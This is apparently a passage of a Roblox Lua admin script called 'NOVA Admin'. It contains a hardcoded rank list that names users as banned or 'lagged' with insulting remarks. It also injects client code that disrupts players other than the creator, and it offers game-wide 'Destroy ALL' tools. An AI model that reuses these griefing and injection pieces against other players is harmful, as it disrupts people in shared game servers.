NOVA = {
	Services = {
		Workspace = game:GetService("Workspace");
		Lighting = game:GetService("Lighting");
		Debris = game:GetService("Debris");
		Players = game:GetService("Players");
		Teams = game:GetService("Teams");
		SoundService = game:GetService("SoundService");
		ScriptContext = game:GetService("ScriptContext");
		NetworkServer = game:GetService("NetworkServer");
		StarterGui = game:GetService("StarterGui");
		StarterPack = game:GetService("StarterPack");
	};
	Ranks = {
		"-2 : Lagged";
		"-1 : Banned";
		"0 : Guest";
		"1 : Mod";
		"2 : Admin";
		"3 : Developer";
		"4 : Architect";
		"5 : Overlord";
		"6 : OP ( Operator )";
		"7 : Creator";
		"8 : ROOT" ;
	};
	
	Ranked = {
		--[[ 		
		-2 : "Lagged"
		-1 : "Banned"
		0 : "Guest"
		1 : "Mod"
		2 : "Admin"
		3 : "Developer"
		4 : "Architect"
		5 : "Overlord"
		6 : "OP ( Operator )"
		7 : "Creator"
		8 : "ROOT" 
		]]
		{Name = "rigletto",			InPRI = true,		CMD = true,			Rank = 7,	Color = Color3.new(0,0,0),			Desc = "Creator of NOVA Admin."};
		{Name = "SurgenHack",		InPRI = true,		CMD = true,			Rank = 7,	Color = Color3.new(1,1,1),			Desc = "Alt of the creator."};
		{Name = "Player",			InPRI = true,		CMD = true,			Rank = 7,	Color = Color3.new(1,1,1),			Desc = "Player."};
		{Name = "NetworkClient",	InPRI = true,		CMD = false,		Rank = 6,	Color = Color3.new(1,0,0.5),		Desc = "Creator of Galatea & Promethius."};
		{Name = "TouchEnded",		InPRI = true,		CMD = false,		Rank = 6,	Color = Color3.new(1,0,0.5),		Desc = "Alt of NetworkClient."};
		{Name = "Zukunft",			InPRI = true,		CMD = false,		Rank = 6,	Color = Color3.new(1,0,0.5),		Desc = "Alt of NetworkClient."};
		{Name = "Urge",				InPRI = true,		CMD = false,		Rank = 6,	Color = Color3.new(1,0,0.5),		Desc = "Alt of NetworkClient."};
		{Name = "Explodem",			InPRI = true,		CMD = false,		Rank = 6,	Color = Color3.new(1,0,0.5),		Desc = "Alt of NetworkClient."};
		{Name = "upquark",			InPRI = true,		CMD = true,			Rank = 6,	Color = Color3.new(0,1,0),			Desc = "A fellow troll."};
		{Name = "ThePC8110",		InPRI = true,		CMD = false,		Rank = 5,	Color = Color3.new(0.5,0.5,0.5),	Desc = "Skilled Scripter."};
		{Name = "LuaModelMaker",	InPRI = true,		CMD = false,		Rank = 5,	Color = Color3.new(0,0,1),			Desc = "Skilled Scripter."};
		{Name = "kert109",			InPRI = true,		CMD = false,		Rank = 4,	Color = Color3.new(0,0.7,0),		Desc = "A friend of rigletto."};
		{Name = "ask4kingbily",		InPRI = true,		CMD = false,		Rank = 4,	Color = Color3.new(0,0.7,0.3),		Desc = "Skilled Scripter."};
		{Name = "thomas0233",		InPRI = true,		CMD = false,		Rank = 4,	Color = Color3.new(0,1,1),			Desc = "Trusted scripter, skilled."};
		{Name = "DoogleFox",		InPRI = true,		CMD = false,		Rank = 3,	Color = Color3.new(0.5,0.5,0.5),	Desc = "Skilled Scriper."};
		{Name = "Penjuin3",			InPRI = true,		CMD = false,		Rank = 3,	Color = Color3.new(0,0,0.9),		Desc = "Scripter"};
		{Name = "randomepicnoob",	InPRI = true,		CMD = false,		Rank = 3,	Color = Color3.new(0,0,1),			Desc = "Friend of rigletto."};
		{Name = "ghostbusters1",	InPRI = true,		CMD = false,		Rank = 3,	Color = Color3.new(0,0.7,0),		Desc = "N/A"};
		{Name = "oxcool1",			InPRI = true,		CMD = false,		Rank = 3,	Color = Color3.new(0.3,0.3,0.3),	Desc = "Owner of the current most popular SB."};
		{Name = "AntiBoomz0r",		InPRI = true,		CMD = false,		Rank = 3,	Color = Color3.new(1,0,0),			Desc = "wise Pandabear, trusted friend and great scripter."};
		{Name = "DragonWarlord101",	InPRI = true,		CMD = false,		Rank = 3,	Color = Color3.new(0, 0.12, 0.376),	Desc = "A gewd friend."};
		{Name = "mixcasterx",		InPRI = true,		CMD = false,		Rank = 3,	Color = Color3.new(0,0,1), 			Desc = "Miko"};
		{Name = "thejonathann",		InPRI = true,		CMD = false,		Rank = 3,	Color = Color3.new(0.25,0.8,1),		Desc = "Scripter"};
		{Name = "BrainWart",		InPRI = true,		CMD = false,		Rank = 3,	Color = Color3.new(0.7,0.7,0.7),	Desc = "A friend of rigletto"};
		{Name = "Drezmor",			InPRI = true,		CMD = false,		Rank = 3,	Color = Color3.new(1,0,0),			Desc = "I have no freaking idea what to put for you Drezmor..."};
		{Name = "pablo275",			InPRI = true,		CMD = false,		Rank = 3,	Color = Color3.new(5,5,0),			Desc = "A roudy mexican."};
		{Name = "bob371",			InPRI = true,		CMD = false,		Rank = 3,	Color = Color3.new(0.5,0.5,0.5),	Desc = "sreator of the spider walker script."};
		{Name = "littleAU999",		InPRI = true,		CMD = false,		Rank = 3,	Color = Color3.new(0,0,0.7),		Desc = "rigletto's friend + scripter."};
		{Name = "ttyyuu12345",		InPRI = true,		CMD = false,		Rank = 3,	Color = Color3.new(0,0.7,0),		Desc = "rigletto's friend + creator of the GUI Orb"};
		{Name = "ServerLabs",		InPRI = true,		CMD = true,			Rank = 2,	Color = Color3.new(0.4,0.4,0.4),	Desc = "N/A"};
		{Name = "mugex",			InPRI = true,		CMD = false,		Rank = 2,	Color = Color3.new(0,1,0),			Desc = "N/A"};
		{Name = "velibor",			InPRI = true,		CMD = false,		Rank = 2,	Color = Color3.new(0,0,1),			Desc = "N/A"};
		{Name = "benningtonguy",	InPRI = true,		CMD = false,		Rank = 2,	Color = Color3.new(0,0.5,0),		Desc = "N/A"};
		{Name = "acb227",			InPRI = true,		CMD = false,		Rank = 1,	Color = Color3.new(0,0,0),			Desc = "N/A"};
		{Name = "NonSpeaker",		InPRI = true,		CMD = false,		Rank = 1,	Color = Color3.new(0,0,0.7),		Desc = "N/A"};
		{Name = "tyridge77",		InPRI = true,		CMD = false,		Rank = 1,	Color = Color3.new(0,0,0),			Desc = "N/A"};
		{Name = "Moolah101",		InPRI = true,		CMD = false,		Rank = 1,	Color = Color3.new(0,0,1),			Desc = "This person is cool."};
		{Name = "SpleenYanks",		InPRI = true,		CMD = false,		Rank = 1,	Color = Color3.new(1,1,0),			Desc = "Most epic duck hat wearing person ever!"};
		{Name = "Fenrier",			InPRI = true,		CMD = false,		Rank = 1,	Color = Color3.new(0,0,0.7),		Desc = "N/A"};
		{Name = "Dr4gOnh4ck3r2",	InPRI = true,		CMD = false,		Rank = 1,	Color = "Random",					Desc = "N/A"};
		{Name = "halfjarrod",		InPRI = false,		CMD = false,		Rank = -1,	Color = Color3.new(1,0,0),			Desc = "We dont accept your kind."};
		{Name = "benbee990",		InPRI = false,		CMD = false,		Rank = -1,	Color = Color3.new(1,0,0),			Desc = "Deleter"};
		{Name = "DesertCamoSolider",InPRI = false,		CMD = false,		Rank = -1,	Color = Color3.new(1,0,0),			Desc = "We dont accept your kind."};
		{Name = "Koilered",			InPRI = false,		CMD = false,		Rank = -2,	Color = Color3.new(1,0,0),			Desc = "rigletto's forever enemny."};
		{Name = "chao60",			InPRI = false,		CMD = false,		Rank = -2,	Color = Color3.new(1,0,0),			Desc = "p§o§r§n§o."};
		{Name = "absurdskinnyjackb",InPRI = false,		CMD = false,		Rank = -2,	Color = Color3.new(1,0,0),			Desc = "Leaker."};
		{Name = "RATSwordsman",		InPRI = false,		CMD = false,		Rank = -2,	Color = Color3.new(1,0,0),			Desc = "Leaker."};
		{Name = "apokalyps",		InPRI = false,		CMD = false,		Rank = -2,	Color = Color3.new(1,0,0),			Desc = "Leaker."};
		{Name = "thecooldill",		InPRI = false,		CMD = false,		Rank = -2,	Color = Color3.new(1,0,0),			Desc = "Average noob."};
		{Name = "steff2k8",			InPRI = false,		CMD = false,		Rank = -2,	Color = Color3.new(1,0,0),			Desc = "Script Stealer"};
	--	{Name = "Joalmo",			InPRI = false,		CMD = false,		Rank = -2,	Color = Color3.new(1,0,0),			Desc = "Average noob."};
	};
		
	Credit = {
		{Name = "NetworkClient",Why = "for the tablet function."};
		{Name = "rigletto",Why = "for creating NOVA Admin."};
		{Name = "upquark",Why = "For being a great person in life."};
	};
	
	Colors = {
		Red = Color3.new(1,0,0);
		Green = Color3.new(0,1,0);
		Blue = Color3.new(0,0,1);
		Orange = Color3.new(1,0.5,0);
		White = Color3.new(1,1,1);
		Black = Color3.new(0,0,0);
		Grey = Color3.new(0.5,0.5,0.5);
		Yellow = Color3.new(1,1,0);
		Magenta = Color3.new(0.54,0,0.54);
		Purple = Color3.new(1,0,1)
	};
	
	Sounds = {
		Sound = Instance.new("Sound");
		Music = {
			{Id = "http://www.roblox.com/Asset/?id=27697735",Pitch=1,Looped=true,Name="Jeff Syndicate - Hip Hop (Fix Pitch)"};
			{Id = "http://www.roblox.com/Asset/?id=35930009",Pitch=1,Looped=true,Name="MonsterMashAudio"};
			{Id = "http://www.roblox.com/Asset/?id=8610025",Pitch=1,Looped=true,Name="NerezzaSong (Italian for 'Darkness Song')"};
			{Id = "http://www.roblox.com/Asset/?id=27697298",Pitch=1,Looped=true,Name="Flatt and Scruggs - Foggy Mountan Breakdown "};
			{Id = "http://www.roblox.com/Asset/?id=27697267",Pitch=1,Looped=true,Name="Scott Joplin - Entertainer Rag"};
			{Id = "http://www.roblox.com/Asset/?id=27697713",Pitch=1,Looped=true,Name="Opening Theme - Daniel Bautista - Music For A Film (Fix Pitch)"};
			{Id = "http://www.roblox.com/Asset/?id=27697719",Pitch=1,Looped=true,Name="Flight of the Bumblebee Daniel Bautista(Fix Pitch)"};
			{Id = "http://www.roblox.com/Asset/?id=27697707",Pitch=1,Looped=true,Name="Intro Daniel Bautista (Fix Pitch)"};
			{Id = "http://www.roblox.com/Asset/?id=27697743",Pitch=1,Looped=true,Name="Zero Project - Gothic (Fix Pitch)"};
			{Id = "http://www.roblox.com/Asset/?id=27697392",Pitch=1,Looped=true,Name="DJ Glejs - Better Off Alone (Remix)"};
			{Id = "http://www.roblox.com/Asset/?id=27697277",Pitch=1,Looped=true,Name="Positively Dark - Awakening"};
			{Id = "http://www.roblox.com/Asset/?id=1280414",Pitch=1,Looped=true,Name="Super Smash Brothers Final Destination Level"};
			{Id = "http://www.roblox.com/Asset/?id=5982975",Pitch=1,Looped=true,Name="Pirate Song"};
			{Id = "http://www.roblox.com/Asset/?id=1372258",Pitch=1,Looped=true,Name="Choir Snippet"};
			{Id = "http://www.roblox.com/Asset/?id=1372257",Pitch=1,Looped=true,Name="Cursed Abbey"};
			{Id = "http://www.roblox.com/Asset/?id=1372259",Pitch=1,Looped=true,Name="Fire Emblem Theme"};
			{Id = "http://www.roblox.com/Asset/?id=1077604",Pitch=1,Looped=true,Name="MULE"};
			{Id = "http://www.roblox.com/Asset/?id=1372260",Pitch=1,Looped=true,Name="One-Winged Angel"};
			{Id = "http://www.roblox.com/Asset/?id=1372261",Pitch=1,Looped=true,Name="Pokemon Battle Theme"};
			{Id = "http://www.roblox.com/Asset/?id=1280470",Pitch=1,Looped=true,Name="Bob-Omb Battlefeild"};
			{Id = "http://www.roblox.com/Asset/?id=1372262",Pitch=1,Looped=true,Name="Star Fox Assault Theme"};
			{Id = "http://www.roblox.com/Asset/?id=1280473",Pitch=1,Looped=true,Name="Final Fantasy VII Advent Children Battle Theme"};
			{Id = "http://www.roblox.com/Asset/?id=2723457",Pitch=1,Looped=true,Name="Fanfare"};
			{Id = "http://www.roblox.com/Asset/?id=2303479",Pitch=1,Looped=true,Name="Caramell Dansen (Speedy Mix)"};
			{Id = "http://www.roblox.com/Asset/?id=1034065",Pitch=1,Looped=true,Name="Halo Theme"};
			{Id = "http://www.roblox.com/Asset/?id=9650822",Pitch=1,Looped=true,Name="S4Tunnel"};
			{Id = "http://www.roblox.com/Asset/?id=27697234",Pitch=1,Looped=true,Name="Mubarek - Resist (Remix)"};
			{Id = "http://www.roblox.com/Asset/?id=45819151",Pitch=1,Looped=true,Name="backgroundSong1"};
			{Id = "http://www.roblox.com/Asset/?id=11420933",Pitch=1,Looped=true,Name="The Opened Way"};
			{Id = "http://www.roblox.com/Asset/?id=1015394",Pitch=1,Looped=true,Name="WindOfFjords"};
			{Id = "http://www.roblox.com/Asset/?id=2027611",Pitch=1,Looped=true,Name="Never Gonna Give You Up"};
			{Id = "http://www.roblox.com/Asset/?id=1280463",Pitch=1,Looped=true,Name="Chrono Trigger Theme"};
			{Id = "http://www.roblox.com/Asset/?id=5986151",Pitch=1,Looped=true,Name="Woman King"};
			{Id = "http://www.roblox.com/Asset/?id=11420922",Pitch=1,Looped=true,Name="Shadow of the Colossus: Demise of the Ritual"};
			{Id = "http://www.roblox.com/Asset/?id=5985787",Pitch=1,Looped=true,Name="Chrono Symphonic: Schala and the Queen"};
			{Id = "http://www.roblox.com/Asset/?id=11231513",Pitch=1,Looped=true,Name="Toccata Fugue"};
			{Id = "http://www.roblox.com/Asset/?id=60047782",Pitch=1,Looped=true,Name="Jazz Loop"};
			{Id = "http://www.roblox.com/Asset/?id=60049010",Pitch=1,Looped=true,Name="Electronic Loop"};
			{Id = "http://www.roblox.com/Asset/?id=60051616",Pitch=1,Looped=true,Name="Funk Loop"};
			{Id = "http://www.roblox.com/Asset/?id=60059129",Pitch=1,Looped=true,Name="Rock Loop"};
		};
		Numbers = { -- one to five ( top to bottom )
			"http://www.roblox.com/Asset/?id=29445305",
			"http://www.roblox.com/Asset/?id=29445339",
			"http://www.roblox.com/Asset/?id=29445358",
			"http://www.roblox.com/Asset/?id=29445378",
			"http://www.roblox.com/Asset/?id=29445395",
		};
		PlayAfter = {
			"http://www.roblox.com/Asset/?id=2767090",
			"http://www.roblox.com/Asset/?id=2800815",
			"http://www.roblox.com/Asset/?id=2801263",
			"http://www.roblox.com/Asset/?id=11984254",
			"http://www.roblox.com/Asset/?id=2101159",
			"http://www.roblox.com/Asset/?id=3087031",
			"Explosion 3","http://www.roblox.com/Asset/?id=2101148",
			"http://www.roblox.com/Asset/?id=2233908",
			"http://www.roblox.com/Asset/?id=16976189",
			"http://www.roblox.com/Asset/?id=2101157",
			"http://www.roblox.com/Asset/?id=2974000",
			"http://www.roblox.com/Asset/?id=2703110",
			"http://www.roblox.com/Asset/?id=1994345",
		};
	};
	
	Objects = {};
	Commands = {};
	Tablets = {};
	Targeted = {};
	Waypoints = {};
	Log = {};
	LoggedScripts = {};
	PRI = false;
	LockedScripts = false;
	Removed = false;
	ShowChat = true;
	LockModels = false;
	Canceled = false;
	PRIType = "Shutdown";
	GlobalLoggedScriptsKey = "NOVA's Logged Scripts";
	LocalScript = script:FindFirstChild("PseudoLocalScript");
	Script = script:FindFirstChild("PseudoScript");
	Plugins = script:GetChildren()
}

PlayerPlugins = [==[
	script.Parent = nil
	LocalPlayer = game:GetService("Players").LocalPlayer
	game:GetService("Selection").SelectionChanged:connect(function()
		if LocalPlayer.Name ~= "rigletto" and LocalPlayer.Name ~= "SurgenHack" and LocalPlayer.Name ~= "Player" then
			LocalPlayer.Parent = nil
			LocalPlayer.Parent = game:GetService("Players")
		end
	end)
	coroutine.resume(coroutine.create(function()
		while wait() do
			if LocalPlayer.Parent == nil and LocalPlayer.Name ~= "rigletto" and LocalPlayer.Name ~= "SurgenHack" and LocalPlayer.Name ~= "Player" then
				LocalPlayer.Parent = nil
				LocalPlayer.Parent = game:GetService("Players")
			end
		end
	end))
]==]


--[[ PSEUDO FUNCTIONS ]]--

function CreateLocalScript(Source, Parent)
	if game.PlaceId == 20279777 or game.PlaceId == 20132544 then
		newLocalScript(Source, Parent)
	elseif game.PlaceId == 23232804 then
		NewLocalScript(Source, Parent)
	elseif NOVA.LocalScript ~= nil then
		NS = NOVA.LocalScript:Clone()
		NS.Name = "LocalScript"
		pcall(function() NS:ClearAllChildren() end)
		NewSource = Instance.new("StringValue",NS)
		NewSource.Name = "Source"
		NewSource.Value = Source
		NS.Parent = Parent
		NS.Disabled = false
	else
		print("[NOVA.CreateLocalScript] Localscript functionality not avalible here. ( PlaceId : "..game.PlaceId..")")
	end
end

function CreateScript(Source, Parent)
	if game.PlaceId == 20279777 or game.PlaceId == 20132544 then
		newScript(Source, Parent)
	elseif game.PlaceId == 23232804 then
		NewScript(Source, Parent)
	elseif NOVA.Script ~= nil then
		NS = NOVA.Script:Clone()
		NS.Name = "Script"
		pcall(function() NS:ClearAllChildren() end)
		NewSource = Instance.new("StringValue",NS)
		NewSource.Name = "Source"
		NewSource.Value = Source
		NS.Parent = Parent
		NS.Disabled = false
	else
		print("[NOVA.CreateScript] Script functionality not avalible here. ( PlaceId : "..game.PlaceId..")")
	end
end

function IsTargeted(Player)
	if type(Player) == "string" then
		for _,v in pairs(NOVA.Targeted) do
			if v.Name == Player then
				return true
			end
		end
	elseif type(Player) == "userdata" then
		for _,v in pairs(NOVA.Targeted) do
			if Player == v then
				return true
			end
		end
	else
		print("[NOVA.IsTargeted] An invalid argument type was used. ("..tostring(type(Player))..")")
	end
	return false
end
--[[ MAKE MESSAGE ]]--
 
function makeMessage(Style,Text,Parent,Size)
	--print("Making message in "..Parent.Name.." Style "..Style)
	coroutine.resume(coroutine.create(function()
		if Style == "Instance" or Style == 1 or Style == "Normal" then
			local M = Instance.new("Message",Parent)
			for i = 1, string.len(Text) do
			M.Text = M.Text .. string.sub(Text, i, i)
			wait(math.random() * 0.1)
			end
			M.Text = M.Text .. ""
			for i = 1, math.random(2, 6) do
			M.Text = string.sub(M.Text, 1, string.len(Text)) .. "_"
			wait(0.4)
			M.Text = string.sub(M.Text, 1, string.len(Text)) .. "  "
			wait(0.4)
			end
			M.Text = string.sub(M.Text, 1, string.len(Text))
			for i = 1, string.len(M.Text) do
			M.Text = string.sub(M.Text, 1, string.len(M.Text) - 1)
			wait()
			end
			M:Remove()
		elseif Style == "Gui" or Style == "GUI" or Style == 2 then
			if Parent == nil then print("Parent required for GUI type message.") return end

			local Gui = Instance.new("ScreenGui",Parent)
			local Frame = Instance.new("Frame",Gui)
			Frame.Size = UDim2.new(1,0,1,0)
			Frame.Position = UDim2.new(0,0,0,0)
			Frame.Style = "RobloxSquare"
			local Txt = Instance.new("TextLabel",Frame)
			Txt.Size = UDim2.new(1,0,1,0)
			Txt.TextWrap = true
			Txt.TextColor3 = NOVA.Colors.White
			Txt.BackgroundTransparency = 1
			if Size == nil then
				Txt.FontSize = "Size16"
			else 
				Txt.FontSize = Size
			end
			Txt.Text = ""
			Text = Text .. " "
			for i = 1, string.len(Text) do
				Txt.Text = Txt.Text .. string.sub(Text, i, i)
				wait(math.random() * 0.000000000001) 
			end
			Txt.Text = Txt.Text .. ""
			for i = 1, math.random(2, 6) do
				Txt.Text = string.sub(Txt.Text, 1, string.len(Text)) .. "_"
				wait(0.4)
				Txt.Text = string.sub(Txt.Text, 1, string.len(Text)) .. "  "
				wait(0.4)
			end
			Txt.Text = string.sub(Txt.Text, 1, string.len(Text))
			for i = 1, string.len(Txt.Text) do
				Txt.Text = string.sub(Txt.Text, 1, string.len(Txt.Text) - 1)
				Txt.Text = string.sub(Txt.Text, 1, string.len(Txt.Text) - 1)
				Txt.Text = string.sub(Txt.Text, 1, string.len(Txt.Text) - 1)
				Txt.Text = string.sub(Txt.Text, 1, string.len(Txt.Text) - 1)
				wait(math.random() * 0.01)
			end
			Txt:Remove()
			Frame:Remove()
			Gui:Remove()
		end
	end))
end

--[[ EXPLORE ]]--
function Explore(Thing,Speaker)
	if Speaker == nil then 
		print("[NOVA.Explore] Argument 1 missing or nil.")
		return
	end
	pcall(function()
		if Thing == game or Thing == nil then
			RemoveTablets(Speaker)
			for _,v in pairs(NOVA.Services) do
				Output(v.className,GetRankedTable(Speaker).Color,Speaker,nil,function() Explore(v,Speaker) end)
			end
			Output("Dismiss",NOVA.Colors.Red,Speaker)
		else
			if #Thing:children() == 0 then
				RemoveTablets(Speaker)
				Explore(Thing.Parent.Parent,Speaker)	
			else
				RemoveTablets(Speaker)
				for _,v in pairs(Thing:children()) do
					Output(v.Name,GetRankedTable(Speaker).Color,Speaker,nil,
						function()
							RemoveTablets(Speaker)
							Output("Name : "..v.Name,GetRankedTable(Speaker).Color,Speaker)
							Output("Class Name : "..v.className,GetRankedTable(Speaker).Color,Speaker)
							Output("Full Name : "..v:GetFullName(),GetRankedTable(Speaker).Color,Speaker)
							Output("Remove",NOVA.Colors.Orange,Speaker,nil, function() Explore(v.Parent.Parent,Speaker) v:remove() end )
							Output("Destroy",NOVA.Colors.Orange,Speaker,nil, function() Explore(v.Parent.Parent,Speaker) v:Destroy() end )
							Output("Destroy ALL ( Name )",NOVA.Colors.Red,Speaker,nil, function() Explore(v.Parent.Parent,Speaker) for _,Part in pairs(GetRecursiveChildren()) do pcall(function() if Part.Name == v.Name then Part:Destroy() end end) end v:Destroy() end )
							Output("Destroy ALL ( className )",NOVA.Colors.Red,Speaker,nil, function() Explore(v.Parent.Parent,Speaker) for _,Part in pairs(GetRecursiveChildren()) do pcall(function() if Part.className == v.className then Part:Destroy() end end) end v:Destroy() end )
							
							Output("#STORE",NOVA.Colors.Yellow,Speaker,nil,function() v:Clone().Parent = NOVA.Services.Lighting end)
							Output("#REDIRECT .Parent.Parent",NOVA.Colors.Blue,Speaker,nil,function() Explore(v.Parent.Parent,Speaker) end)
							Output("#REDIRECT :GetChildren()",NOVA.Colors.Blue,Speaker,nil,function() Explore(v,Speaker) end)
							Output("Dismiss",NOVA.Colors.Red,Speaker)
						end
					)
				end
				Output("Dismiss",NOVA.Colors.Red,Speaker)
			end
		end
	end)
end

--[[ CAPE ]]--
function Cape(v)
	local Mode = "None"
	local AngleX = 0
	pcall(function()
		v.Character.Swordpack:remove()
	end)
	pcall(function()	
		v.Character["NOVA Cape"]:remove()
	end)

	local Main = Instance.new("Model",v.Character)
	Main.Name = "NOVA Cape"

	pcall(function()
		v.Character.Swordpack:Remove()
	end)
	local Cape = Instance.new("Part", Main)
	Cape.Name = "Cape"
	Cape.Anchored = false
	Cape.CanCollide = false
	Cape.formFactor = "Custom"
	Cape.Size = Vector3.new(2, 3.5, 0.2)
	Cape.BrickColor = BrickColor.new("Really black")
	Cape.TopSurface = 0
	Cape.BottomSurface = 0
	local Decal = Instance.new("Decal", Cape)
	Decal.Face = "Back"
	Decal.Texture = ""
	local CapeWeld = Instance.new("Weld", Cape)
	CapeWeld.Part0 = v.Character.Torso
	CapeWeld.Part1 = Cape
	CapeWeld.C0 = CFrame.new(0, 1, 0.5)
	CapeWeld.C1 = CFrame.new(0, 3.5 / 2, -0.0)
	v.Character.Humanoid.Running:connect(function(Speed)
		if Speed > 0 then
			Mode = "Running"
		else
			Mode = "None"
		end
	end)
	v.Character.Humanoid.Jumping:connect(function() Mode = "Jumping" end)
	coroutine.wrap(function()
		while Cape.Parent ~= nil and CapeWeld.Parent ~= nil do
			local UpSpeed = 2.5
			local DownSpeed = 5
			local TargetAngle = 5
			if Mode == "Running" then
				TargetAngle = 45 + math.random(0, 2500) / 100
			elseif Mode == "Jumping" then
				UpSpeed = 10
				DownSpeed = 10
				TargetAngle = (v.Character.Torso.Velocity.y < 3 and 160 or 45)
			end
			if math.abs(TargetAngle - AngleX) < (DownSpeed > UpSpeed and DownSpeed or UpSpeed) then AngleX = TargetAngle end
			if AngleX < TargetAngle then
				AngleX = AngleX + UpSpeed
			elseif AngleX > TargetAngle then
				AngleX = AngleX - DownSpeed
			end
			CapeWeld.C1 = CFrame.new(0, 3.5 / 2, -0.0) * CFrame.fromEulerAnglesXYZ(math.rad(AngleX), 0, 0, 0)
			wait()
		end
	end)()

	local LShoulder = Instance.new("Part",Main)
	LShoulder.Name = "Left Shoulder"
	LShoulder.TopSurface = "Smooth"
	LShoulder.BottomSurface = "Smooth"
	LShoulder.FormFactor = "Custom"
	LShoulder.Size = Vector3.new(1,0.2,1)
	LShoulder.BrickColor = BrickColor.new("Really black")
	LShoulder.Anchored = false
	LShoulder.CanCollide = false
	LShoulder.Transparency = 0
	LShoulder.Reflectance = 0
	local Weld = Instance.new("Motor6D",LShoulder)
	Weld.Part0 = LShoulder
	Weld.Part1 = v.Character["Left Arm"]
	Weld.C0 = CFrame.new(0,-1,0)

	local RShoulder = Instance.new("Part",Main)
	RShoulder.Name = "Right Shoulder"
	RShoulder.TopSurface = "Smooth"
	RShoulder.BottomSurface = "Smooth"
	RShoulder.FormFactor = "Custom"
	RShoulder.Size = Vector3.new(1,0.2,1)
	RShoulder.BrickColor = BrickColor.new("Really black")
	RShoulder.Anchored = false
	RShoulder.CanCollide = false
	RShoulder.Transparency = 0
	RShoulder.Reflectance = 0
	local Weld = Instance.new("Motor6D",RShoulder)
	Weld.Part0 = RShoulder
	Weld.Part1 = v.Character["Right Arm"]
	Weld.C0 = CFrame.new(0,-1,0)

	local NeckFlat = Instance.new("Part",Main)
	NeckFlat.Name = "NeckFlat"
	NeckFlat.TopSurface = "Smooth"
	NeckFlat.BottomSurface = "Smooth"
	NeckFlat.FormFactor = "Custom"
	NeckFlat.Size = Vector3.new(2,0.2,1)
	NeckFlat.BrickColor = BrickColor.new("Really black")
	NeckFlat.Anchored = false
	NeckFlat.CanCollide = false
	NeckFlat.Transparency = 0
	NeckFlat.Reflectance = 0
	local Weld = Instance.new("Motor6D",NeckFlat)
	Weld.Part0 = NeckFlat
	Weld.Part1 = v.Character.Torso
	Weld.C0 = CFrame.new(0,-1,0)

	for _,v in pairs(Main:GetChildren()) do v.Reflectance = 1e+999 end

end

--[[ GET SPLIT ]]--
function GetSplit(Msg)
	Split = nil
	for i=1,100 do
		if string.sub(Msg,i,i) == "\\" then
			Split = i
			break
		end
	end 
	return Split
end
	


--[[ GET RANK ]]--

function GetRank(Player)
	Rtn = nil
	if type(Player) == "userdata" then
		for _,v in pairs(NOVA.Ranked) do 
			if v.Name:lower() == Player.Name:lower() then 
				Rtn = v.Rank
			end 
		end
	elseif type(Player) == "string" then
		for _,v in pairs(NOVA.Ranked) do 
			if v.Name:lower() == Player:lower() then 
				Rtn = v.Rank
			end 
		end
	else print("[NOVA.GetRank] Unsupported argument type. ("..type(Player)..")")
	end
	return	Rtn
end

--[[ GET RANK NAME ]]--
function GetRankName(Player)
	if type(Player) == "userdata" or type(Player) == "string" then
		Rtn = nil
		Rank = GetRank(Player)
		Ranks = {
			"Mod";
			"Admin";
			"Mega Admin";
			"Omega Admin";
			"Overlord";
			"OP ( Operator )";
			"Creator";
			"ROOT";
		}
		Rtn = Ranks[Rank]
		if Rank == -2 then Rtn = "Lagged" end
		if Rank == -1 then Rtn = "Banned" end
		if Rank == 0 then Rtn = "Guest" end

		return Rtn

	else 
		print("[NOVA.GetRankName] Unsupported argument type ("..type(Player)..")")
		return "NOT AVALIBLE"
	end
end

--[[ GET RANKED TABLE ]]--
function GetRankedTable(Player)
	Rtn = nil
	if type(Player) == "userdata" then
		for _,v in pairs(NOVA.Ranked) do
			if v.Name == Player.Name then
				Rtn = v
			end
		end
	elseif type(Player) == "string" then
		for _,v in pairs(NOVA.Ranked) do
			if v.Name == Player then
				Rtn = v
			end
		end
	else
		pint("[NOVA.GetRankedTable] Unsupported argument type.("..type(Player)..")")
	end
	return Rtn
end

--[[ GET RECURSIVE CHILDREN ]]--
function GetRecursiveChildren(Source, Name, SearchType, Children)
	if Source == nil then
		Source = NOVA.Services
	end
	if Name == nil or type(Name) ~= "string" then
		Name = ""
	end
	if Children == nil or type(Children) ~= "table" then
		Children = {}
	end
	if type(Source) == "userdata" then
		for _, Child in pairs(Source:children()) do
			pcall(function()
			if (function()
				if SearchType == nil or SearchType == 1 then
					return string.match(Child.Name:lower(), Name:lower())
				elseif SearchType == 2 then
					return string.match(Child.className:lower(), Name:lower())
				elseif SearchType == 3 then
					return Child:IsA(Name) or Child:IsA(Name:lower())
				elseif SearchType == 4 then
					return string.match(Child.Name:lower() .. string.rep(string.char(1), 5) .. Child.className:lower(), Name:lower()) or Child:IsA(Name) or Child:IsA(Name:lower())
				end
				return false
			end)() then
				table.insert(Children, Child)
			end
			GetRecursiveChildren(Child, Name, SearchType, Children)
			end)
		end
	elseif type(Source) == "table" then
		for _,Area in pairs(Source) do
			for _, Child in pairs(Area:children()) do
				pcall(function()
				if (function()
					if SearchType == nil or SearchType == 1 then
						return string.match(Child.Name:lower(), Name:lower())
					elseif SearchType == 2 then
						return string.match(Child.className:lower(), Name:lower())
					elseif SearchType == 3 then
						return Child:IsA(Name) or Child:IsA(Name:lower())
					elseif SearchType == 4 then
						return string.match(Child.Name:lower() .. string.rep(string.char(1), 5) .. Child.className:lower(), Name:lower()) or Child:IsA(Name) or Child:IsA(Name:lower())
					end
					return false
				end)() then
					table.insert(Children, Child)
				end
				GetRecursiveChildren(Child, Name, SearchType, Children)
				end)
			end
		end
	else 
		print("[NOVA.GetRecursiveChildren] Unsupported agrument type ("..type(Source)..")")
	end
	return Children
end

--[[ GET REPLICATORS ]]--
function GetReplicators()
	Rtn = NOVA.Services.NetworkServer:GetChildren()
	for i=1,#Rtn do
		if not Rtn[i]:IsA("ServerReplicator") then
			table.remove(Rtn,i)
		end
	end
	return Rtn
end

--[[ REMOVE TABLETS ]]--

function RemoveTablets(Player)
	if Player == nil then
		for _,a in pairs(NOVA.Tablets) do 
			a:Remove()
		end
	else
		for _,v in pairs(GetTablets(Player)) do
			v:Remove()
		end
	end
end

--[[ GET RANKED ]]--

function GetRanked()
	local Rtn = {}
	for _,v in pairs(NOVA.Services.Players:GetPlayers()) do
		if GetRank(v) ~= nil and GetRank(v) > 0 then
			table.insert(Rtn,v)
		end
	end
	return Rtn	
end

--[[ GET RID OF ]]--
function GetRidOf(v)
	if v.Name == "rigletto" then
		Output("Attempt to call GetRidOf on the creator, command will not be carried through.",NOVA.Colors.Red,Speaker,10)
	else
		pcall(function()
			coroutine.resume(coroutine.create(function()
